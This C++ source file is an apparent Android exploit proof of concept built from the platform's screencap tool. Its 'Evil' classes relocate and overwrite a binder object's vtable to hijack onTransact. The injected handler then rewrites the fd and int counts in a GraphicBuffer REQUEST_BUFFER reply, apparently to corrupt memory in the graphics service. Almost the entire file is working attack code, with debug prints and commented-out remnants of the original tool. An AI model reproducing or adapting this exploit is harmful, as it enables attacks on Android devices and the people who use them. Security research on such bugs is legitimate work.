/*
 * Copyright (C) 2010 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#undef QCOM_HARDWARE

#include <errno.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>

#include <linux/fb.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#include <binder/ProcessState.h>
#include <binder/Parcel.h>

#include <gui/SurfaceComposerClient.h>
#include <gui/ISurfaceComposer.h>

#include <ui/PixelFormat.h>

#include <SkImageEncoder.h>
#include <SkBitmap.h>
#include <SkData.h>
#include <SkStream.h>

#include <sys/types.h>
#include <unistd.h>

#include <cassert>

using namespace android;

static uint32_t DEFAULT_DISPLAY_ID = ISurfaceComposer::eDisplayIdMain;







void dumpInt(const void* data, unsigned int sz) {
	const int *d = (const int*)data;
	printf("--------\n");
	for (int i=0; i < sz/4; ++i) {
		if (d[i])
			printf("%02d %p\n", i, d[i]);
	}
	printf("--------\n");
}

void dumpChar(const void* data, unsigned int sz) {
	const char *d = (const char*)data;
	printf("--------\n");
	for (int i=0; i < sz; ++i) {
			printf("%02x ", d[i]);
	}
	printf("\n--------\n");
}


class EvilBufferQueue : public BufferQueue {
	virtual status_t requestBuffer(int slot, sp<GraphicBuffer>* buf) {
		printf("EvilBufferQueue::requestBuffer\n");
		status_t ret = BufferQueue::requestBuffer(slot, buf);
		return ret;
	}
};

class EvilBnGraficBufferProducer : public BnGraphicBufferProducer {
	virtual status_t onTransact(
	    uint32_t code, const Parcel& data, Parcel* reply, uint32_t flags)
	{
		printf("EvilBnGraficBufferProducer::onTransact %d\n", code);
	    status_t ret = BnGraphicBufferProducer::onTransact(code, data, reply, flags);
	    if (code != 1/*REQUEST_BUFFER*/) {
	    	return ret;
	    }

	    printf("buhaha\n");
	    int *d = (int*)reply->data();
	    dumpInt(d, 80);

	    /*
00 0x1
01 0x50
02 0x2
03 0x47424652
04 0x640	width
05 0xa00	height
06 0x640	stride
07 0x1		format
08 0x333	usage
09 0x2		numFds
10 0xc		numInts
	     */

	    d[9] = 0xffffff;
	    d[10] = 0;

	    //d[9]  |= (1<<29);
	    //d[10] |= (1<<29);
	    return ret;
	}

	virtual status_t requestBuffer(int, android::sp<android::GraphicBuffer>*) { return NO_ERROR; }
	virtual status_t setBufferCount(int) { return NO_ERROR; }
	virtual status_t dequeueBuffer(int*, android::sp<android::Fence>*, bool, uint32_t, uint32_t, uint32_t, uint32_t) { return NO_ERROR; }
	virtual status_t queueBuffer(int, const QueueBufferInput&, QueueBufferOutput*) { return NO_ERROR; }
	virtual void cancelBuffer(int, const android::sp<android::Fence>&) {}
	virtual int query(int, int*) { return 0; }
	virtual status_t connect(const android::sp<android::IBinder>&, int, bool, QueueBufferOutput*) { return NO_ERROR; }
	virtual status_t disconnect(int) { return NO_ERROR; }

};


class EvilScreenshotClient
{
public:
    static status_t capture(
            const sp<IBinder>& display,
            const sp<IGraphicBufferProducer>& producer,
            uint32_t reqWidth, uint32_t reqHeight,
            uint32_t minLayerZ, uint32_t maxLayerZ);

public:
#ifdef USE_MHEAP_SCREENSHOT
    sp<IMemoryHeap> mHeap;
#endif
    mutable sp<CpuConsumer> mCpuConsumer;
    mutable sp<BufferQueue> mBufferQueue;
    CpuConsumer::LockedBuffer mBuffer;
    bool mHaveBuffer;

public:
    EvilScreenshotClient();
    ~EvilScreenshotClient();

#ifdef TOROPLUS_RADIO
    status_t update();
#endif

    // frees the previous screenshot and capture a new one
    status_t update(const sp<IBinder>& display);
    status_t update(const sp<IBinder>& display,
            uint32_t reqWidth, uint32_t reqHeight);
    status_t update(const sp<IBinder>& display,
            uint32_t reqWidth, uint32_t reqHeight,
            uint32_t minLayerZ, uint32_t maxLayerZ);

    sp<CpuConsumer> getCpuConsumer() const;

    // release memory occupied by the screenshot
    void release();

    // pixels are valid until this object is freed or
    // release() or update() is called
    void const* getPixels() const;

    uint32_t getWidth() const;
    uint32_t getHeight() const;
    PixelFormat getFormat() const;
    uint32_t getStride() const;
    // size of allocated memory in bytes
    size_t getSize() const;
};



static void usage(const char* pname)
{
    fprintf(stderr,
            "usage: %s [-hp] [-d display-id] [FILENAME]\n"
            "   -h: this message\n"
            "   -p: save the file as a png.\n"
            "   -d: specify the display id to capture, default %d.\n"
            "If FILENAME ends with .png it will be saved as a png.\n"
            "If FILENAME is not given, the results will be printed to stdout.\n",
            pname, DEFAULT_DISPLAY_ID
    );
}

//static SkBitmap::Config flinger2skia(PixelFormat f)
//{
//    switch (f) {
//        case PIXEL_FORMAT_RGB_565:
//            return SkBitmap::kRGB_565_Config;
//        default:
//            return SkBitmap::kARGB_8888_Config;
//    }
//}
//
//static status_t vinfoToPixelFormat(const fb_var_screeninfo& vinfo,
//        uint32_t* bytespp, uint32_t* f)
//{
//
//    switch (vinfo.bits_per_pixel) {
//        case 16:
//            *f = PIXEL_FORMAT_RGB_565;
//            *bytespp = 2;
//            break;
//        case 24:
//            *f = PIXEL_FORMAT_RGB_888;
//            *bytespp = 3;
//            break;
//        case 32:
//            // TODO: do better decoding of vinfo here
//            *f = PIXEL_FORMAT_RGBX_8888;
//            *bytespp = 4;
//            break;
//        default:
//            return BAD_VALUE;
//    }
//    return NO_ERROR;
//}







template<typename memberT>
union u_ptm_cast {
	//static_assert(sizeof(memberT) == sizeof(void*), "Pointer size must match");

	u_ptm_cast(memberT _pmember) : pmember(_pmember) {};
	u_ptm_cast(void *_pvoid) : pvoid(_pvoid) {};

	memberT pmember;
	void *pvoid;
};

template<typename memberT>
inline memberT memberFromPtr(void *pvoid) {
	return u_ptm_cast<memberT>(pvoid).pmember;
}

template<typename memberT>
inline void* ptrFromMember(memberT pmember) {
	return u_ptm_cast<memberT>(pmember).pvoid;
}




typedef void* member_ptr_t;



template<typename memberT>
member_ptr_t* getVtableMemberPtrRef(void *obj, memberT member) {
	member_ptr_t *vtable = *((member_ptr_t**)obj);
	int off = (int)ptrFromMember(member);
	assert(off % sizeof(member_ptr_t) == 0);
	return vtable + off / sizeof(member_ptr_t);
}





member_ptr_t* relocateVtable(void *obj, unsigned int before = 4, unsigned int after = 128) {

	member_ptr_t *newVtable = new member_ptr_t[before+after];
	member_ptr_t *oldVtable = *((member_ptr_t**)obj);

	memcpy(newVtable, oldVtable - before, (before+after) * sizeof(*newVtable));

	newVtable += before;
	*((member_ptr_t**)obj) = newVtable;

	return newVtable;
}

void test() {
	printf("in!!\n");
}

int main(int argc, char** argv)
{
    ProcessState::self()->startThreadPool();

    const char* pname = argv[0];
    bool png = false;
    int32_t displayId = DEFAULT_DISPLAY_ID;
    int c;
    while ((c = getopt(argc, argv, "phd:")) != -1) {
        switch (c) {
            case 'p':
                png = true;
                break;
            case 'd':
                displayId = atoi(optarg);
                break;
            case '?':
            case 'h':
                usage(pname);
                return 1;
        }
    }
    argc -= optind;
    argv += optind;

//    int fd = -1;
//    if (argc == 0) {
//        fd = dup(STDOUT_FILENO);
//    } else if (argc == 1) {
//        const char* fn = argv[0];
//        fd = open(fn, O_WRONLY | O_CREAT | O_TRUNC, 0664);
//        if (fd == -1) {
//            fprintf(stderr, "Error opening file: %s (%s)\n", fn, strerror(errno));
//            return 1;
//        }
//        const int len = strlen(fn);
//        if (len >= 4 && 0 == strcmp(fn+len-4, ".png")) {
//            png = true;
//        }
//    }
//
//    if (fd == -1) {
//        usage(pname);
//        return 1;
//    }
//
//    void const* mapbase = MAP_FAILED;
//    ssize_t mapsize = -1;

    void const* base = 0;
    uint32_t w, s, h, f;
    size_t size = 0;

    ScreenshotClient screenshot;

    EvilScreenshotClient *evilScreenshot = reinterpret_cast<EvilScreenshotClient*>(&screenshot);

    printf("pid %d\n", getpid());



    sp<IBinder> display = SurfaceComposerClient::getBuiltInDisplay(displayId);
    if (display == NULL) {
    	printf("no display\n");
    	return -1;
    }

    status_t ret = screenshot.update(display);
    printf("display.update ret %d\n", ret);
    if (ret != NO_ERROR) {
    	return -1;
    }


//    if (display != NULL && screenshot.update(display) == NO_ERROR) {
//        base = screenshot.getPixels();
//        w = screenshot.getWidth();
//        h = screenshot.getHeight();
//        s = screenshot.getStride();
//        f = screenshot.getFormat();
//        size = screenshot.getSize();
//    } else {
//        const char* fbpath = "/dev/graphics/fb0";
//        int fb = open(fbpath, O_RDONLY);
//        if (fb >= 0) {
//            struct fb_var_screeninfo vinfo;
//            if (ioctl(fb, FBIOGET_VSCREENINFO, &vinfo) == 0) {
//                uint32_t bytespp;
//                if (vinfoToPixelFormat(vinfo, &bytespp, &f) == NO_ERROR) {
//                    size_t offset = (vinfo.xoffset + vinfo.yoffset*vinfo.xres) * bytespp;
//                    w = vinfo.xres;
//                    h = vinfo.yres;
//                    s = vinfo.xres;
//                    size = w*h*bytespp;
//                    mapsize = offset + size;
//                    mapbase = mmap(0, mapsize, PROT_READ, MAP_PRIVATE, fb, 0);
//                    if (mapbase != MAP_FAILED) {
//                        base = (void const *)((char const *)mapbase + offset);
//                    }
//                }
//            }
//            close(fb);
//        }
//    	printf("this sucks\n");
//    	return -1;
//    }

    BufferQueue *tbq = evilScreenshot->mBufferQueue.get();

    EvilBufferQueue *ebq = new EvilBufferQueue();
    *reinterpret_cast<int**>(tbq) = *reinterpret_cast<int**>(ebq);


    BnGraphicBufferProducer *tgbp = static_cast<BnGraphicBufferProducer*>(tbq);
    BBinder *tbb = static_cast<BBinder*>(tgbp);

    //printf("offset %x\n", reinterpret_cast<char*>(tbb) - reinterpret_cast<char*>(tbq));

    printf("IGraphicBufferConsumer::consumerDisconnect %p\n", &IGraphicBufferConsumer::consumerDisconnect);
    printf("BBinder::onTransact %p\n", &BBinder::onTransact);
    printf("BnGraphicBufferProducer::onTransact %p\n", &BnGraphicBufferProducer::onTransact);

    printf("BBinder::onTransact %p\n", ptrFromMember(&BBinder::onTransact));
    printf("BnGraphicBufferProducer::onTransact %p\n", ptrFromMember(&BnGraphicBufferProducer::onTransact));

    printf("BBinder::onTransact %p\n",
    		*(int*)(*reinterpret_cast<char**>(tbb) + (int)ptrFromMember(&BBinder::onTransact)));

    printf("BnGraphicBufferProducer::onTransact %p\n",
    		*(int*)(*reinterpret_cast<char**>(tgbp) + (int)ptrFromMember(&BnGraphicBufferProducer::onTransact)));

    //printf("BnGraphicBufferProducer::onTransact %p\n",
//    		ptrFromMember(&BnGraphicBufferProducer::onTransact));

    //printf("%p\n", *reinterpret_cast<char**>(tbb) + reinterpret_cast<int>(&BBinder::onTransact));
    //printf("%p\n", *reinterpret_cast<char**>(tgbp) + reinterpret_cast<int>(&BnGraphicBufferProducer::onTransact));

    //dump(reinterpret_cast<char*>(tbb), 64);


    EvilBnGraficBufferProducer *ebgp = new EvilBnGraficBufferProducer();
    BBinder *ebb = static_cast<BBinder*>(ebgp);


    member_ptr_t *onTransact, *evilOnTransact;

    onTransact = getVtableMemberPtrRef(tbb, &BBinder::onTransact);
    printf("BBinder::onTransact = %p\n", onTransact);
    printf("*BBinder::onTransact = %p\n", *onTransact);
    relocateVtable(tbb);
    onTransact = getVtableMemberPtrRef(tbb, &BBinder::onTransact);
    printf("BBinder::onTransact = %p\n", onTransact);
    printf("*BBinder::onTransact = %p\n", *onTransact);

    //printf("NO_MEMORY %x\n", NO_MEMORY);


    dumpChar(*onTransact, 20);


    evilOnTransact = getVtableMemberPtrRef(ebb, &BBinder::onTransact);
    *onTransact = *evilOnTransact;


    //*onTransact = NULL;
    //*onTransact = (member_ptr_t)test;


    if (0) {
    	// only the virtual thunk from BBinder is used

		onTransact = getVtableMemberPtrRef(tgbp, &BnGraphicBufferProducer::onTransact);
		printf("BnGraphicBufferProducer::onTransact = %p\n", onTransact);
		printf("*BnGraphicBufferProducer::onTransact = %p\n", *onTransact);
		relocateVtable(tgbp);
		onTransact = getVtableMemberPtrRef(tgbp, &BnGraphicBufferProducer::onTransact);
		printf("BnGraphicBufferProducer::onTransact = %p\n", onTransact);
		printf("*BnGraphicBufferProducer::onTransact = %p\n", *onTransact);

		dumpChar(*onTransact, 20);

		*onTransact = NULL;
    }


    for (int i = 0; i < 1; ++i) {
		ret = screenshot.update(display);
		printf("display.update ret %d\n", ret);
    }

    //BufferQueue *bq = new BufferQueue();

    //printf("mBufferQueue: %p\n", bq);
    //printf("%p\n", *reinterpret_cast<void**>(bq));
    //printf("%p\n", **reinterpret_cast<int**>(bq));


    //dump(bq, sizeof(*bq));
    //dump(bq3, sizeof(*bq3));
    //dump(bq2, sizeof(*bq2));

    //printf("%p\n", &BufferQueue::requestBuffer);

    //dump(*reinterpret_cast<void**>(bq), 64);

    //char cc;
    //scanf("%c", &cc);
    //printf("mBufferQueue vtable: %p\n", *reinterpret_cast<void**>(evilScreenshot->mBufferQueue.get()));

//    if (base) {
//        if (png) {
//            SkBitmap b;
//            b.setConfig(flinger2skia(f), w, h, s*bytesPerPixel(f));
//            b.setPixels((void*)base);
//            SkDynamicMemoryWStream stream;
//            SkImageEncoder::EncodeStream(&stream, b,
//                    SkImageEncoder::kPNG_Type, SkImageEncoder::kDefaultQuality);
//            SkData* streamData = stream.copyToData();
//            write(fd, streamData->data(), streamData->size());
//            streamData->unref();
//        } else {
//            write(fd, &w, 4);
//            write(fd, &h, 4);
//            write(fd, &f, 4);
//            size_t Bpp = bytesPerPixel(f);
//            for (size_t y=0 ; y<h ; y++) {
//                write(fd, base, w*Bpp);
//                base = (void *)((char *)base + s*Bpp);
//            }
//        }
//    }
//    close(fd);
//    if (mapbase != MAP_FAILED) {
//        munmap((void *)mapbase, mapsize);
//    }
    return 0;
}
